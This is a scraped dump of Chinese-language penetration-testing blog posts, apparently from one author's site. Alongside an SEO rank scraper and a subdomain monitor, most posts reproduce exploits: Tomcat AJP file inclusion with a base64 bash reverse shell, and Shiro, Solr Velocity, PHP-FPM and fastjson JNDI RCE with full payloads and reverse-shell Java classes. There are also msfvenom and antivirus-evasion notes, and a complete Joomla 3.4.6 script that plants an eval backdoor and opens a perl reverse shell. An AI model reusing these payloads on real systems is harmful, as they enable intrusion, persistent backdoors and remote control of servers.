'Accept-Language': 'zh-CN,zh;q=0.9', 'Cookie': 'BDTUJIAID=febc82b216a29e116730505bc1e471a9; inputbox_urls=%5b%22passivcashincome.com%22%2c%22feifeizuida.com%22%5d; UM_distinctid=16e63892b4e3b1-031b6053dcfc9f-7711b3e-100200-16e63892b4fa8a; Hm_lvt_aecc9715b0f5d5f7f34fba48a3c511d6=1579746706; CNZZDATA433095=cnzz_eid%3D297046501-1578041490-null%26ntime%3D1583974744; CNZZDATA5082706=cnzz_eid%3D902178444-1578044637-null%26ntime%3D1583975389; qHistory=aHR0cDovL3Rvb2wuY2hpbmF6LmNvbV/nq5nplb/lt6Xlhbd8aHR0cDovL3JhbmsuY2hpbmF6LmNvbV/nmb7luqbmnYPph43mn6Xor6J8aHR0cDovL3Rvb2wuY2hpbmF6LmNvbS90b29scy9lc2NhcGUuYXNweF9Fc2NhcGXliqDlr4Yv6Kej5a+GfGh0dHA6Ly93aG9pcy5jaGluYXouY29tL3JldmVyc2UrV2hvaXPlj43mn6V8aHR0cDovL3dob2lzLmNoaW5hei5jb20vK1dob2lz5p+l6K+i', 'Connection': 'close' } def process(): print('[+] 正在后台打开谷歌浏览器...') chrome_option = Options() chrome_option.add_argument('blink-settings=imagesEnabled=false') #不加载图片, 提升速度 chrome_option.add_argument('--headless') #浏览器不提供可视化页面. linux下如果系统不支持可视化不加这条会启动失败 chrome_option.add_experimental_option('excludeSwitches', ['enable-logging'])#关闭控制台日志，看着太乱 driver=webdriver.Chrome(options=chrome_option) driver.set_page_load_timeout(5000) print('[+] 正在查询中，请稍等 ~') num=0 with open(&quot;url.txt&quot;) as f: for line in f: try: quanzhong=line.strip('\\n') site=quanzhong.strip('https://') driver.get('http://rank.chinaz.com/all/{domain}'.format(domain=site)) baidurank_pattern = re.compile(r'csstools.chinaz.com/tools/images/public/baiduapp/(.*?).gif') try: html_text = driver.page_source.encode('utf-8') baidurank = re.findall(baidurank_pattern,html_text.decode('utf-8'))[0] except: time.sleep(2.5) html_text = driver.page_source.encode('utf-8') baidurank = re.findall(baidurank_pattern,html_text.decode('utf-8'))[0] num=num+1 print(&quot;[+] 正在查询第&quot;+str(num)+&quot;条&quot;+&quot; 百度权重:&quot;+str(baidurank)+&quot; url: &quot;+site) if int(baidurank) &gt; 0: with open('seo_1.txt','a',encoding='utf-8') as l: l.write(site+'\\n') except Exception as e: pass driver.close() 0x03 运行 1.python3 Baidu_Rank.py 即可 2.内置读取同目录的url.txt文件 3.权重大于1的网址存入同目录rank_1.txt文件 github链接：https://github.com/sv3nbeast/Baidu_Rank ","link":"https://www.svenbeast.com/post/QjiX32_Cm/"},{"title":"Tomcat文件包含及读取漏洞（CVE-2020-1938漏洞复现）","content":"0x01 漏洞影响 Apache Tomcat 9.x &lt; 9.0.31 Apache Tomcat 8.x &lt; 8.5.51 Apache Tomcat 7.x &lt; 7.0.100 Apache Tomcat 6.x 0x02 前提 目标机器开启AJP Connector 服务端口（默认开启，为8009端口） 0x03 文件读取&amp;文件包含RCE 文件读取 python2 &quot;Tomcat-ROOT路径下文件读取(CVE-2020-1938).py&quot; -p 8009 -f /WEB-INF/web.xml 127.0.0.1 文件包含 python2 &quot;Tomcat-ROOT路径下文件包含(CVE-2020-1938).py&quot; -p 8009 -f /test.txt 127.0.0.1 test.txt &lt;% java.io.InputStream in = Runtime.getRuntime().exec(&quot;ping fiohed.dnslog.cn&quot;).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(&quot;&lt;/pre&gt;&quot;); %&gt; 0x04 反弹shell shell.txt &lt;% java.io.InputStream in = Runtime.getRuntime().exec(&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyNC41LzE4ODg4IDA+JjE=}|{base64,-d}|{bash,-i}&quot;).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1){ out.println(new String(b)); } out.print(&quot;&lt;/pre&gt;&quot;); %&gt; 反弹shell用的命令需要进行bash编码 在线bash编码：http://www.jackson-t.ca/runtime-exec-payloads.html POC下载地址：https://github.com/sv3nbeast/CVE-2020-1938-Tomact-file_include-file_read 0x05 参考链接 https://twitter.com/jas502n/status/1230531680999395328 https://forum.90sec.com/t/topic/801 ","link":"https://www.svenbeast.com/post/fqSI9laE8/"},{"title":"为OneForAll增加一个新增域名监控插件（One_Monitor）","content":"0x01 背景 需要一个域名监控工具，本着工具越简单越好的理念，写了一个只能满足我需要的插件，好吧，其实是组装轮子的时候需要这个功能，然后有这功能的工具又都太乱了，我觉得有点冗余 -.-! 0x02 代码 OneForAll(精灵师傅的子域名工具): https://github.com/shmilylty/OneForAll One_Monitor(新增域名监控插件): https://github.com/sv3nbeast/One_Monitor # -*- coding:utf-8 -*- import re import sys import os import time import datetime path=&quot;C:/Users/Administrator/Desktop/tools/OneForAll/oneforall&quot; #OneForAll绝对路径，需手动配置 old=path+&quot;/域名监控/old_domain/&quot; #存放上次扫描结果的文件夹，需手动创建并填写此配置 new=path+&quot;/域名监控/new_domain/&quot; #存放最新扫描结果的文件夹，需手动创建并填写此配置 update=path+&quot;/域名监控/update/&quot; #存放新增域名结果的文件夹,需手动创建并填写此配置 old_import=path+&quot;/域名监控/old_import/&quot; #存放目标域名数据库导出的上次结果,需手动创建并填写此配置 result_name=path+&quot;/results/&quot; #存放oneforall结果的文件夹路径,默认配置即可 # print f_list def result_txt(result_name): #生成监控域名扫描结果的txt文件名字 f_list = os.listdir(result_name) with open(&quot;result_name.txt&quot;,&quot;w&quot;) as r: for i in f_list: # os.path.splitext():分离文件名与扩展名 if os.path.splitext(i)[1] == '.txt': r.write(i+&quot;\\n&quot;) return True def update_domain(): #简化新旧扫描结果并进行对比，发现新增域名 f=open('result_name.txt','r') lines=f.readlines() f.close() for line in lines: line1=line.strip('\\n') target=line1[0:(line1.rfind('_', 1))] #获得本次扫描目标域名 table_name=target.replace('.',&quot;_&quot;)+&quot;_now&quot; #获得目标域名数据库存储表名 print(&quot;[+] 开始导出&lt;&quot;+target+&quot;&gt;数据库记录，用做后面的对比&quot;) print(os.system(&quot;python dbexport.py --table %s --format txt --dpath %s&quot; %(table_name,old_import))) old_path=old+line1 #存放上次域名结果文件 new_path=new+line1 #存放本次域名结果文件 old_result_subdomain=old_import+table_name+&quot;_subdomain.txt&quot; #存放域名扫描结果文件 new_result_subdomain=result_name+line1 now_time = datetime.datetime.now().strftime('%Y-%m-%d') #获得当前日期，为新增域名做准备 update_subdomain=update+&quot;update_&quot;+now_time+&quot;_&quot;+line1 #为新增域名文件起个名字，防止重复 f=open(old_result_subdomain, encoding=&quot;utf-8&quot;) f.close lines=f.read() pattern = re.compile(r'\\|(http.*?://.*?)[ |]') result = pattern.findall(lines) print(&quot;[+] 获得&lt;&quot;+target+&quot;&gt;上次扫描子域名结果中 &quot;) with open(old_path,'w') as fopen: for subdomain_old in result: fopen.write(subdomain_old+&quot;\\n&quot;) print(&quot;[+] 开始扫描子域名,时间较长，请耐心等待...&quot;) os.system(&quot;python oneforall.py --target %s --format txt run&quot; %target) #print(&quot;[+]当前监控域名:&quot;+target+&quot;[+]&quot;+os.system(&quot;python oneforall.py --target %s --format txt run&quot; %target)) f=open(new_result_subdomain, encoding=&quot;utf-8&quot;) f.close lines=f.read() pattern = re.compile(r'\\|(http.*?://.*?)[ |]') result = pattern.findall(lines) print(&quot;[+] 扫描完成，获得&lt;&quot;+target+&quot;&gt;最新扫描子域名结果中 &quot;) with open(new_path,'w') as fopen: for subdomain_new in result: fopen.write(subdomain_new+&quot;\\n&quot;) print(&quot;[*] 开始检测&lt;&quot;+target+&quot;&gt;域名是否新增...&quot;) str1 = [] file_1 = open(old_path,&quot;r&quot;,encoding=&quot;utf-8&quot;) print(&quot;[+] 已打开old_domain存储的上次扫描结果：&quot;+line1+&quot;文件，开始获取域名并存入数组old&quot;) for line in file_1.readlines(): str1.append(line.replace(&quot;\\n&quot;,&quot;&quot;)) str2 = [] file_2 = open(new_path, &quot;r&quot;, encoding=&quot;utf-8&quot;) print(&quot;[+] 已打开new_domain存储的本次扫描结果：&quot;+line1+&quot;文件，开始获取域名并存入数组new&quot;) for line in file_2.readlines(): str2.append(line.replace(&quot;\\n&quot;, &quot;&quot;)) str_dump = [] print(&quot;[+] 正在对比数组获得新增域名中&quot;) for line in str2: if line not in str1: str_dump.append(line) #将两个文件重复的内容取出来 if len(str_dump) &lt; 1: print(&quot;[+] 检测完成，不存在新增域名，请等待下一周期检测！&quot;) else: print(&quot;[+] 检测完成，存在新增域名:&quot;+&quot;\\n&quot;) for str in str_dump: #去重后的结果写入文件 print(&quot; &quot;+str) with open(update_subdomain,&quot;a+&quot;,encoding=&quot;utf-8&quot;) as f: f.write(str + &quot;\\n&quot;) num=len(str_dump) number=num*900 min=num*30 print(&quot;\\n&quot;+&quot;[+] &quot;+&quot;本次新增%s&quot;%num +&quot;个域名，将等待%s&quot;%min+&quot;分钟后执行下次任务&quot;) if __name__ == '__main__': result_txt(result_name) update_domain() 0x03 运行前提 1.配置好代码里的绝对路径，创建好文件夹，保证名称无误，One_Monitor.py放在和onforall.py同一路径下运行 2.首先对想监控的域名用oneforall扫一遍，结果为txt格式 3.我设置了一个域名30分钟的延迟，因为是实时漏扫，给留的时间，不需要可以删掉 4.应该没啥了，代码灰常简单，有问题一看就知道的，有问题可以交流。还希望有人也能分享我一个代码简单但实用的脚本（附一个测试图，是计划任务启动的，所以是白板） ","link":"https://www.svenbeast.com/post/-y8PKMNR2/"},{"title":"记录一次免杀的粗鄙操作(MSF+shellcode+某杀毒)","content":"0x01 背景 ········· ········· ······· 做一个记录~ ······ ···· ···· 0x01 环境 临时公网vbs一个：94.191.125.65 目标机：Windows2016并安装好360+火绒(截止到2020·1·22病毒库) 攻击机：windwos10 语言环境： 0x02 大概过程 1.在VBS上开启frp，使MSF拥有公网ip 2.生成shellcode（94.191.125.65，4446） 3.shellcode加载器运行收shell 0x03 结果 1.虽然是老方法，不过胜在比较自由（gif加载中...）(也可以shellcode放在公网进行请求，若被杀可以对代码重新进行其他编码处理) ","link":"https://www.svenbeast.com/post/tSl508OMg/"},{"title":"跨年诶，phpcms后台getshell","content":" 细节在tools里，我就是过年不知道发啥，大晚上那就复现一下吧。。吧。（抢到个云悉邀请码，开森） ","link":"https://www.svenbeast.com/post/XzA6X7QIp/"},{"title":"kali转发公网+过杀毒+配合msf入侵windows7","content":"0x01 此篇为个人记录 工具人一枚， 就会组合操作， 菜是原罪。 0x02 配置frp，使kali接受公网shell 配置内容： 公网windows的frps.ini配置内容 [common] bind_port = 7000 dashboard_port = 7500 dashboard_user = admin dashboard_pwd = admin 虚拟机kali机的frpc.ini配置内容 [common] server_addr = 129.28.191.182 //鄙人的公网ip server_port = 7000 [msf] type = tcp local_ip = 127.0.0.1 local_port = 6666 remote_port = 4446 * 命令按顺序排序： ./frps -c frps.ini &gt; log.txt &amp; //公网windows开启frp ./frpc -c frpc.ini &gt; log.txt &amp; //虚拟机kali开启frp 后门设置：lhsot：129.28.191.182 lport:4446 0x03 shellter生成后门 尝试过多种方法，最后发现这个比较香（目标机器为*60时，可用） 0x04 在Win7的*60套餐中获得meterpreter 下次联动cs，作为web狗得慢慢来 -.-! ","link":"https://www.svenbeast.com/post/RD6ZQ1MX_/"},{"title":"java RMI反序列化无含量记录","content":" 识别端口类型为java RMI时，尝试利用此漏洞 参考链接：https://www.freebuf.com/vuls/126499.html ","link":"https://www.svenbeast.com/post/TWAepnjZi/"},{"title":"windwos提权-CVE-2019-1388","content":"感觉打开新大门？？ https://github.com/sv3nbeast/CVE-2019-1388 0x00 手动过程 ","link":"https://www.svenbeast.com/post/OsMblUp6w/"},{"title":"Shiro<=1.4.1 padding oracle attack导致RCE","content":"0x01 背景 shiro是一个java场景使用较多组件，最近曝出因使用了 AES-128-CBC 模式对cookie进行加密，so可 以padding oracle攻击构造数据进行反序列化攻击 影响版本： 1.2.4&lt;shiro&lt;=1.4.1 0x02 环境 靶机：windows10 + tomcat + shiro1.4.1 shiro环境：https://pan.baidu.com/s/1E72vhls9oOI-ny4luDTi3A 提取码: uakn 攻击机：windows10 + burpsuite + python Exp：https://xxx.com 0x03 复现 1.靶机shiro环境正常显示 2.登录 3.生成payload.class java -jar ysoserial.jar CommonsCollections1 &quot;ping dnslog.com&quot; &gt; payload.class 4.取cookie的rememberMe值 5.生成恶意rememberMe值 需输入3个参数，目标url，正常rememberMe值，payload.class，我跑了应该是20分左右，具体没看 &gt;&gt;python2 shiro_exp.py http://172.20.10.3:8080/shiro-1.4.1/home.jsp rememberMe值 payload.class 6.使用生成的恶意rememberMe值进行访问 PS：此处访问需要先退出刚才的登录，在未登录情况下使用恶意remeberMe进行访问，由此才可造成RCE 同时也可理解为，获得一次任意登录后得remeberMe值后，以后再利用则无需获取新的值,想要执行其他命令，继续使用初始的remeberMe值进行遍历。 0x04 坑点 1.耗费时间 2.需要注销后进行注入恶意rememberMe访问，差点自闭，毕竟无参考且没人提过，或者我姿势不对？？ 3.友情提示不要用linux虚拟机当做靶机进行遍历，虚拟机会内存红色告急，可以先快照试试，不过不一定管事 （默默超心痛我的kali机，-.-!） ","link":"https://www.svenbeast.com/post/-leT8b8Kh/"},{"title":"Apache_Flink任意jar包上传导致RCE","content":"0x00 影响版本 目前最新版本Apache Flink 1.9.1 生成jar包 msfvenom -p java/shell_reverse_tcp LHOST=x.x.x.x LPORT=x -f jar &gt;test.jar 监听并上传 shell ps：无话(f**k)可说 ","link":"https://www.svenbeast.com/post/GJfB5twey/"},{"title":"学习使我快乐","content":"晓 古人学问无遗力，少壮工夫老始成。纸上得来终觉浅，绝知此事要躬行。 少年易老学难成，一寸光阴不可轻。未觉池塘春草梦，阶前梧叶已秋声。 明日复明日，明日何其多！我生待明日，万事成蹉跎。世人若被明日累， 春去秋来老将至。朝看水东流，暮看日西坠，百年明日能几何？请君听我《明日歌》 继续深入学习代码审计 ps:为什么别人的0day像炒土豆丝那么简单，我的就像做满汉全席🏊‍♀ ","link":"https://www.svenbeast.com/post/i3isd2Yq0/"},{"title":"Apache Solr Velocity远程代码执行漏洞利用","content":"0x01 描述 攻击者可以在未授权的情况下利用该漏洞，远程发送精心构造的HTTP请求，从而在受影响服务器上进行远程代码执行。 0x02 范围 Apache Solr 5.x至8.x版本 0x03 复现 1.获取path 2.更改设置 POC 使用刚才的path替换路径的test POST /solr/test/config HTTP/1.1 Host: 192,168.1.1:8983 Content-Type: application/json Content-Length: 263 { &quot;update-queryresponsewriter&quot;: { &quot;startup&quot;: &quot;lazy&quot;, &quot;name&quot;: &quot;velocity&quot;, &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;, &quot;template.base.dir&quot;: &quot;&quot;, &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;, &quot;params.resource.loader.enabled&quot;: &quot;true&quot; } } 3.命令执行 POC 使用刚才的path替换路径的test GET /solr/test/select?q=1&amp;&amp;wt=velocity&amp;v.template=custom&amp;v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1 Host: 192.168.1.1:8983 Content-Type: application/json Content-Length: 263 0x04 反弹shell 1.对bash命令进行runtime编码，在进行url编码，即可成功反弹 2.成功反弹到vbs 0x05 修复 官方暂未发布，可关注官网获取补丁或版本更新：http://lucene.apache.org/solr/ ","link":"https://www.svenbeast.com/post/QmuCuXJa9/"},{"title":"Nginx的PHP-FPM远程代码执行漏洞复现","content":"0x01 背景 在9 月 14 日至 18 举办的 Real World CTF 中，国外安全研究员 Andrew Danau 在解决一道 CTF 题目时发现， 向目标服务器 URL 发送 %0a 符号时，服务返回异常，疑似存在漏洞。 Nginx 上 fastcgi_split_path_info 在处理带有 %0a 的请求时，会因为遇到换行符 \\n 导致 PATH_INFO 为空。 而 php-fpm 在处理 PATH_INFO 为空的情况下，存在逻辑缺陷。 攻击者通过精心的构造和利用，可以导致远程代码执行。 漏洞编号：CVE-2019-11043 漏洞 PoC 在 10 月 22 日公开。 0x02 影响范围 Nginx + php-fpm的服务器（php&gt;5.6），在使用如下配置的情况下，都可能存在远程代码执行漏洞。 location ~ [^/]\\.php(/|$) { fastcgi_split_path_info ^(.+?\\.php)(/.*)$; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_pass php:9000; } } 0x03 环境搭建 靶机：ubuntu， Vulhub，docker 命令集合 mkdir CVE-2019-11043 cd CVE-2019-11043/ wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/default.conf wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/docker-compose.yml mkdir www cd www/ wget https://raw.githubusercontent.com/vulhub/vulhub/master/php/CVE-2019-11043/www/index.php cd ../ service docker start sudo docker-compose up -d 访问 http://靶机ip:8080/index.php 0x04 漏洞利用 poc是使用go语言编写的，这里已经编译好exe，提供下载 链接: https://pan.baidu.com/s/1bbV15sw-Yx-PX3LFIE2ggA 提取码: sven usage：phuip-fpizdam.exe http://192.168.43.21:8080/index.php 有go语言环境的可以直接运行 git clone https://github.com/neex/phuip-fpizdam.git cd phuip-fpizdam go run . &quot;http://your-ip:8080/index.php&quot; poc运行完毕后可以直接远程代码执行，?a=whoami usage:输入命令后，需要多执行几次刷新，以访问到被污染的进程。 index.php源码 0x05 漏洞成因 因为“fpm_main.c”文件的第1150行代码中由于\\n(%0a)的传入导致nginx传递给php-fpm的PATH_INFO为空。 https://github.com/php/php-src/blob/master/sapi/fpm/fpm/fpm_main.c#L1150 进而导致可以通过FCGI_PUTENV与PHP_VALUE相结合，修改当前的php-fpm进程中的php配置。在特殊构造的配置生效的情况下可以触发任意代码执行。 ","link":"https://www.svenbeast.com/post/dyp738nRt/"},{"title":"fastjson<=1.2.47反序列化漏洞复现","content":"0x01 背景 努力学习ing~ 为以后遇到java环境增加测试项做准备，防止一脸懵逼情况发生🙀，一般到时再看为时已晚，so先下手为强😇。 0x02 网络环境 攻击机： os:windows10 服务器： os:kali虚拟机，ip:192.168.124.55，jdk版本:jdk8u181，中间件:tomcat9 目标机： os:ubuntu虚拟机，ip：172.21.139.103，中间件：tomcat9，jdk版本:jdk8u181 0x03 环境搭建 unbutu&amp;kali安装jdk：jdk8u181 链接: https://pan.baidu.com/s/1nI-JT93vjcA9--7fb0fhqw&amp;shfl=shareset 提取码: sven tomcat下载：https://mirrors.tuna.tsinghua.edu.cn/apache/tomcat/tomcat-9/v9.0.27/bin/apache-tomcat-9.0.27.tar.gz fastjson1.2.47： 链接: https://pan.baidu.com/s/1C022L851nIkq4zy5hiG_TA&amp;shfl=shareset 提取码: sven 工具：marshalsec，需要用mvn打包一下，github：https://github.com/mbechler/marshalsec 链接(已打包好): https://pan.baidu.com/s/1kT9vwhNDDdiJ3dL9BS3U4w&amp;shfl=shareset 提取码: sven mvn打包截图及使用命令 细节配置就不说了，大概就是服务器开启ldap并配置web能访问到exp，靶机安装好jdk放入fastjson环境，然后攻击机使用poc进行请求，完事 访问靶机界面： 0x04 漏洞利用 Exploit: import java.io.BufferedReader; import java.io.InputStream; import java.io.InputStreamReader; public class Exploit{ public Exploit() throws Exception { Process p = Runtime.getRuntime().exec(&quot;touch /tmp/fastjson.test&quot;); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); String line; while((line = reader.readLine()) != null) { System.out.println(line); } p.waitFor(); is.close(); reader.close(); p.destroy(); } public static void main(String[] args) throws Exception { } } 1.编译一下Exploit.java,生成Exploit.class，将2个文件放入服务器webapps/fastjson下 2.服务器使用marshalsec开启ldap服务： java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://192.168.124.55:8080/fastjson/#Exploit 8088 3.查看一下靶机源码，发现参数name和age，构造一下，回显正常， ps:真实环境中这些都是目标机自带的，找到提交json的地方构造poc即可 4.放上poc，查看靶机是否成功执行命令 POST /fastjson/ HTTP/1.1 Host: 192.168.124.34:8080 Pragma: no-cache Cache-Control: no-cache Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Length: 256 { &quot;name&quot;: { &quot;@type&quot;: &quot;java.lang.Class&quot;, &quot;val&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot; }, &quot;x&quot;: { &quot;@type&quot;: &quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;: &quot;ldap://192.168.124.55:8088/fastjson/Exploit&quot;, &quot;autoCommit&quot;: true } } 5.服务器的Ldap已接收到请求，靶机的/tmp/fastjson.test文件也已存在，命令成功执行 0x05 反弹shell 坑点之一，java反弹shell，无法直接使用bash -i &gt;&amp; /dev/tcp/119.28.130.53/18888 0&gt;&amp;1 反弹shell_Exp: import java.io.BufferedReader; import java.io.InputStream; import java.io.InputStreamReader; public class Exploit{ public Exploit() throws Exception { Process p = Runtime.getRuntime().exec(new String[]{&quot;/bin/bash&quot;,&quot;-c&quot;,&quot;exec 5&lt;&gt;/dev/tcp/192.168.124.5/888;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;}); InputStream is = p.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(is)); String line; while((line = reader.readLine()) != null) { System.out.println(line); } p.waitFor(); is.close(); reader.close(); p.destroy(); } public static void main(String[] args) throws Exception { } } 0x06 坑点 1.未编译Exploit.java，只放入服务器1个.java文件 2.java反弹shell无法直接使用linux命令反弹 3.jdk版本需要注意，下方图片jdk版本不存在此漏洞 ","link":"https://www.svenbeast.com/post/c0VE5mjC-/"},{"title":"Joomla 3.4.6-RCE漏洞利用","content":"0x01 背景 Joomla是一套支持多种语言，全球都有名的CMS系统。其实日常也见不到😗 这次披露的是Joomla 3.4.6版本，最新版本目前是3.9.12 0x02 搭建环境 下载地址：https://github.com/joomla/joomla-cms/releases/download/3.4.6/Joomla_3.4.6-Stable-Full_Package.zip 让我们来使用phpstudy_pro来搭建环境吧🙃，这次不会再有后门了吧 0x03 getshell 已经有成型exp了，让我们直接上手吧，成功getshell 它会在configuration.php文件中写入一句话，密码为vchvnalfdvnrrogormraprcrclduahcmjsyclppxegutxrjhog 0x04 exp 一位师傅已经写好的，我搬过来的 usage:python3 rce.py -t http://127.0.0.1 -e #!/usr/bin/env python3 import requests from bs4 import BeautifulSoup import sys import string import random import argparse from termcolor import colored PROXS = {'http':'127.0.0.1/Joomla_3.4.6'} PROXS = {} def random_string(stringLength): letters = string.ascii_lowercase return ''.join(random.choice(letters) for i in range(stringLength)) backdoor_param = random_string(50) def print_info(str): print(colored(&quot;[*] &quot; + str,&quot;cyan&quot;)) def print_ok(str): print(colored(&quot;[+] &quot;+ str,&quot;green&quot;)) def print_error(str): print(colored(&quot;[-] &quot;+ str,&quot;red&quot;)) def print_warning(str): print(colored(&quot;[!!] &quot; + str,&quot;yellow&quot;)) def get_token(url, cook): token = '' resp = requests.get(url, cookies=cook, proxies = PROXS) html = BeautifulSoup(resp.text,'html.parser') # csrf token is the last input for v in html.find_all('input'): csrf = v csrf = csrf.get('name') return csrf def get_error(url, cook): resp = requests.get(url, cookies = cook, proxies = PROXS) if 'Failed to decode session object' in resp.text: #print(resp.text) return False #print(resp.text) return True def get_cook(url): resp = requests.get(url, proxies=PROXS) #print(resp.cookies) return resp.cookies def gen_pay(function, command): # Generate the payload for call_user_func('FUNCTION','COMMAND') template = 's:11:&quot;maonnalezzo&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\\\0\\\\0\\\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\\\0\\\\0\\\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:FUNC_LEN:&quot;FUNC_NAME&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:LENGTH:&quot;PAYLOAD&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\\\0\\\\0\\\\0connection&quot;;i:1;}' #payload = command + ' || $a=\\'http://wtf\\';' payload = 'http://l4m3rz.l337/;' + command # Following payload will append an eval() at the enabled of the configuration file #payload = 'file_put_contents(\\'configuration.php\\',\\'if(isset($_POST[\\\\\\'test\\\\\\'])) eval($_POST[\\\\\\'test\\\\\\']);\\', FILE_APPEND) || $a=\\'http://wtf\\';' function_len = len(function) final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function))) return final def make_req(url , object_payload): # just make a req with object print_info('Getting Session Cookie ..') cook = get_cook(url) print_info('Getting CSRF Token ..') csrf = get_token( url, cook) user_payload = '\\\\0\\\\0\\\\0' * 9 padding = 'AAA' # It will land at this padding working_test_obj = 's:1:&quot;A&quot;:O:18:&quot;PHPObjectInjection&quot;:1:{s:6:&quot;inject&quot;;s:10:&quot;phpinfo();&quot;;}' clean_object = 'A&quot;;s:5:&quot;field&quot;;s:10:&quot;AAAAABBBBB' # working good without bad effects inj_object = '&quot;;' inj_object += object_payload inj_object += 's:6:&quot;return&quot;;s:102:' # end the object with the 'return' part password_payload = padding + inj_object params = { 'username': user_payload, 'password': password_payload, 'option':'com_users', 'task':'user.login', csrf :'1' } print_info('Sending request ..') resp = requests.post(url, proxies = PROXS, cookies = cook,data=params) return resp.text def get_backdoor_pay(): # This payload will backdoor the the configuration .PHP with an eval on POST request function = 'assert' template = 's:11:&quot;maonnalezzo&quot;:O:21:&quot;JDatabaseDriverMysqli&quot;:3:{s:4:&quot;\\\\0\\\\0\\\\0a&quot;;O:17:&quot;JSimplepieFactory&quot;:0:{}s:21:&quot;\\\\0\\\\0\\\\0disconnectHandlers&quot;;a:1:{i:0;a:2:{i:0;O:9:&quot;SimplePie&quot;:5:{s:8:&quot;sanitize&quot;;O:20:&quot;JDatabaseDriverMysql&quot;:0:{}s:5:&quot;cache&quot;;b:1;s:19:&quot;cache_name_function&quot;;s:FUNC_LEN:&quot;FUNC_NAME&quot;;s:10:&quot;javascript&quot;;i:9999;s:8:&quot;feed_url&quot;;s:LENGTH:&quot;PAYLOAD&quot;;}i:1;s:4:&quot;init&quot;;}}s:13:&quot;\\\\0\\\\0\\\\0connection&quot;;i:1;}' # payload = command + ' || $a=\\'http://wtf\\';' # Following payload will append an eval() at the enabled of the configuration file payload = 'file_put_contents(\\'configuration.php\\',\\'if(isset($_POST[\\\\\\'' + backdoor_param +'\\\\\\'])) eval($_POST[\\\\\\''+backdoor_param+'\\\\\\']);\\', FILE_APPEND) || $a=\\'http://wtf\\';' function_len = len(function) final = template.replace('PAYLOAD',payload).replace('LENGTH', str(len(payload))).replace('FUNC_NAME', function).replace('FUNC_LEN', str(len(function))) return final def check(url): check_string = random_string(20) target_url = url + 'index.php/component/users' html = make_req(url, gen_pay('print_r',check_string)) if check_string in html: return True else: return False def ping_backdoor(url,param_name): res = requests.post(url + '/configuration.php', data={param_name:'echo \\'PWNED\\';'}, proxies = PROXS) if 'PWNED' in res.text: return True return False def execute_backdoor(url, payload_code): # Execute PHP code from the backdoor res = requests.post(url + '/configuration.php', data={backdoor_param:payload_code}, proxies = PROXS) print(res.text) def exploit(url, lhost, lport): # Exploit the target # Default exploitation will append en eval function at the end of the configuration.pphp # as a bacdoor. btq if you do not want this use the funcction get_pay('php_function','parameters') # e.g. get_payload('system','rm -rf /') # First check that the backdoor has not been already implanted target_url = url + 'index.php/component/users' make_req(target_url, get_backdoor_pay()) if ping_backdoor(url, backdoor_param): print_ok('Backdoor implanted, eval your code at ' + url + '/configuration.php in a POST with ' + backdoor_param) print_info('Now it\\'s time to reverse, trying with a system + perl') execute_backdoor(url, 'system(\\'perl -e \\\\\\'use Socket;$i=&quot;'+ lhost +'&quot;;$p='+ str(lport) +';socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};\\\\\\'\\');') if __name__ == '__main__': parser = argparse.ArgumentParser() parser.add_argument('-t','--target',required=True,help='Joomla Target') parser.add_argument('-c','--check', default=False, action='store_true', required=False,help='Check only') parser.add_argument('-e','--exploit',default=False,action='store_true',help='Check and exploit') parser.add_argument('-l','--lhost', required='--exploit' in sys.argv, help='Listener IP') parser.add_argument('-p','--lport', required='--exploit' in sys.argv, help='Listener port') args = vars(parser.parse_args()) url = args['target'] if(check(url)): print_ok('Vulnerable') if args['exploit']: exploit(url, args['lhost'], args['lport']) else: print_info('Use --exploit to exploit it') else: print_error('Seems NOT Vulnerable ;/') 